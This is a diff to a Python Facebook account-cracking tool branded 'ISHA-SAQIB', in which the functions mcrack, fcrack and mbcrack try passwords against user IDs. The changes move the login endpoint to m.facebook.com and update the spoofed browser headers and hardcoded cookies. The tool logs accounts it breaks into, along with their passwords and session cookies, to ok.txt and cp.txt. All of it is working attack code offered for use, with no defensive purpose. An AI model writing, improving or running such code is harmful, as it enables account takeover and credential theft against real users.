@@ -462,7 +462,7 @@ def mcrack(uid,pwx,tl):
 			sys.stdout.write(f'\r [\033[1;92mISHA-SAQIB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
 			sys.stdout.flush()
 			ua = random.choice(syed)
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://m.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -473,43 +473,42 @@ def mcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'free.facebook.com',
-			'method': 'GET',
-			'path': '/?_rdc=1&_rdr',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'cookie': 'sb=72h5Yfy3MPZu-fDS2fHlQNJK; datr=72h5Yfu_775zGtKAFn2seoJ4; m_pixel_ratio=1; wd=452x625; fr=0QYoHFb8AwdGkSnGI.AWVhMUNQwRp9q2irEbXYtgplDaw.BiqZOT.5r.AAA.0.0.Bi-LPO.AWXQItjIZdU',
-			'dnt': '1',
-			'referer': 'https://www.google.com/',
-			'sec-ch-ua': '".Not/A)Brand";v="99", "Avast Secure Browser";v="103", "Chromium";v="103"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Windows"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'cross-site',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': ua}
-			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			header_freefb = {"authority": 'm.facebook.com',
+            "method": 'GET',
+            "path": '/',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=0.9',
+            "cache-control": 'max-age=0',
+            "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ; sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; m_pixel_ratio=1; wd=988x620; fr=0ynMdHfwmiiQmPdzx.AWV5WIxycaY929vKZFSVBeJvhzU.Bjp-qS.uB.AAA.0.0.BjqVor.AWWw0rbR4JY',
+            "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'none',
+            "sec-fetch-user": '?1',
+            "upgrade-insecure-requests": '1',
+            "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+			lo = session.post('https://m.facebook.com/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[7:22]
-				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
+				uid = coki[7:22]
+				print('\033[1;92m[SAQIB-OK] '+uid+' | '+ps+'\033[1;32m')
 				cek_apk(session,coki)
 				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
-				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
+				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				oks.append(uid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[24:39]
-				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
+				uid = coki[24:39]
+				print('\033[1;91m[ISHA-CP] '+uid+' | '+ps+'\033[0;97m')
+				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				cps.append(uid)
 				break
 			else:
 				continue
@@ -587,19 +586,19 @@ def fcrack(uid,pwx,tl):
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[7:22]
-				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
+				uid = coki[7:22]
+				print('\033[1;92m[SAQIB-OK] '+uid+' | '+ps+'\033[1;32m')
 				cek_apk(session,coki)
 				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
-				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
+				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				oks.append(uid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[24:39]
-				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
+				uid = coki[24:39]
+				print('\033[1;91m[ISHA-CP] '+uid+' | '+ps+'\033[0;97m')
+				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				cps.append(uid)
 				break
 			else:
 				continue
@@ -677,19 +676,19 @@ def mbcrack(uid,pwx,tl):
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[7:22]
-				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
+				uid = coki[7:22]
+				print('\033[1;92m[SAQIB-OK] '+uid+' | '+ps+'\033[1;32m')
 				cek_apk(session,coki)
 				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
-				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
+				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				oks.append(uid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[24:39]
-				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
+				uid = coki[24:39]
+				print('\033[1;91m[ISHA-CP] '+uid+' | '+ps+'\033[0;97m')
+				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				cps.append(uid)
 				break
 			else:
 				continue
